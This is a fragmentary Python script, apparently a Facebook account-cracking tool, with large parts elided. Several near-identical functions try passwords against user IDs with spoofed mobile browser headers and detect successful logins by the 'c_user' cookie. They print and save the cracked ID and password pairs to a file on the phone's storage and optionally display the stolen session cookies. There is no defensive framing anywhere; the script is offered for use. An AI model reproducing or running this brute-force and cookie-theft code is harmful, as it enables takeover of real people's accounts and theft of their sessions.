...
os.system("xdg-open https://facebook.com/groups/1430148900897205/")
#app  check 
...
def xerx2():
	...
	print('[?] Ids saved in HONEY-OK.txt,XERX-CP.txt')
	print(47*"-")
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				print('\33[1;92m[HONEY-OK] '+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in xerx_xd:
					...
					break
				open('/sdcard/HONEY-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M1-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M2-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M3-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				print('\33[1;92m[HONEY-OK]\033[1;32m'+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in xerx_xd:
					print(f"\033[1;33m[COOKIES 🌺]: \033[1;32m{coki}")
					print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
					cek_apk(session,coki)
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M5-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M6-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
